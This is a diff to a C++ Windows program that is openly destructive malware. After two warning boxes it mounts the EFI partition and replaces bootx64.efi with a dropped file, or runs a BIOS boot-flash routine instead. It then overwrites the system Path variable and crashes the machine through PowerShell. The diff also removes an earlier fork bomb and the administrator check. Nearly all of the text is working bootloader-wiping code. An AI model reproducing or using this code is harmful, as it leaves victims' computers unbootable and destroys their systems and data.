@@ -8,45 +8,23 @@
 #include <direct.h>
 #include <fstream>
 #include <vector>
+#include <winbase.h>
 
 using namespace std;
 
 void MountEFI() {
-    const DWORD bufferSize = 1024;
-    WCHAR volumeName[bufferSize];
-    WCHAR volumePathNames[bufferSize];
-    DWORD bytesReturned;
-
-    // Find the first volume
-    HANDLE hFindVolume = FindFirstVolume(volumeName, bufferSize);
-    if (hFindVolume != INVALID_HANDLE_VALUE) {
-        do {
-            // Get volume path names
-            if (GetVolumePathNamesForVolumeName(volumeName, volumePathNames, bufferSize, &bytesReturned)) {
-                // Check if it's the EFI system partition
-                if (wcsstr(volumePathNames, L"EFI") != NULL) {
-                    // Define a DOS device for the volume
-                    if (DefineDosDevice(DDD_RAW_TARGET_PATH, L"Z:", volumeName)) {
-                        std::cout << "Mounted EFI on Z:" << std::endl;
-                    }
-                }
-            }
-        } while (FindNextVolume(hFindVolume, volumeName, bufferSize));
-        FindVolumeClose(hFindVolume);
-    }
+    system("mountvol P: /S");
 }
 
 void UnpackDeps() {
-    // Unpack the dependencies
-    CopyFile(L"Checkr.dll", L"C:\\Windows\\system32\\explorer.bat", false);
     CopyFile(L"appvcompat.dll", L"C:\\Windows\\system32\\boot.bin", false);
     CopyFile(L"appverifui.dll", L"C:\\Windows\\system32\\boot.efi", false);
 }
 
-bool is_efi() {
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
-    return si.dwNumberOfProcessors;
+DWORD is_efi() {
+    char buffer[1024];
+    DWORD envvar = GetFirmwareEnvironmentVariable(L"", L"{00000000 - 0000 - 0000 - 0000 - 000000000000}", buffer, sizeof(buffer));
+    return envvar;
 }
 
 int BIOSBootFlash() {
@@ -98,8 +76,6 @@ int BIOSBootFlash() {
     return 0;
 }
 
-//Added a function to set a system variable to a string
-
 bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
     HKEY hKey;
     LPCTSTR keyPath = TEXT("System\\CurrentControlSet\\Control\\Session Manager\\Environment");
@@ -115,16 +91,9 @@ bool SetPermanentEnvironmentVariable(LPCTSTR value, LPCTSTR data) {
     return false;
 }
 
-//function that creates a batch file which will be the forkbomb.
-
-void forkbomb() {
-    const char* path = "C:\\Windows";
-    _chdir(path);
-    /*const char* batchpath = "C:\\Windows\\system.bat";*/
-    ShellExecute(NULL, L"start", L"C:\\Windows\\explorer.bat", NULL, NULL, SW_HIDE);
+void crash() {
+    system("powershell -c \"wininit\"");
 }
-
-//it checks if the user is admin. if not it will prompt them to do so and quit.
 
 BOOL IsElevated() {
     BOOL fRet = FALSE;
@@ -144,44 +113,28 @@ BOOL IsElevated() {
 
 int main()
 {
-    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
 
-    bool checkadmin = IsElevated();
-    
-    if (!checkadmin) {
-        int errbox = MessageBox(NULL, L"Cannot continue in user mode. You must run this as administrator!", L"ERROR: You must run this as admin!", MB_OK | MB_ICONERROR);
-        return 0;
-        exit(0);
-    }
+    UnpackDeps();
 
     int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL| MB_ICONEXCLAMATION);
-
-    if (confirmbox == IDCANCEL) {
-        return 0;
-    }
+    if (confirmbox == IDCANCEL) return 0;
     
     int secondconfirmbox = MessageBox(NULL, L"ALL DATA WILL BE DESTROYED! Are you sure you want to continue?", L"WARNING (Double check)", MB_OKCANCEL | MB_ICONEXCLAMATION);
-    
-    if (secondconfirmbox == IDCANCEL) {
-        return 0;
-    }
-    if (is_efi() == 0) {
-        //EFI Code here
+    if (secondconfirmbox == IDCANCEL) return 0;
+
+    if (is_efi() != ERROR_INVALID_FUNCTION) {
         MountEFI();
-        DeleteFile(L"Z:\\EFI\\Boot\\bootx64.efi");
-        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"Z:\\EFI\\Boot\\bootx64.efi", false);
+        DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
+        CopyFile(L"C:\\Windows\\system32\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
         
     }
     else {
-        //BIOS Code here
         BIOSBootFlash();
     }
 
-    
+	SetPermanentEnvironmentVariable(L"Path", L"trololol");
+	crash();
 
-    forkbomb();
-
-    //SetPermanentEnvironmentVariable(L"Path", L"trololol");
-
-    return 0;
+	return 0;
 }
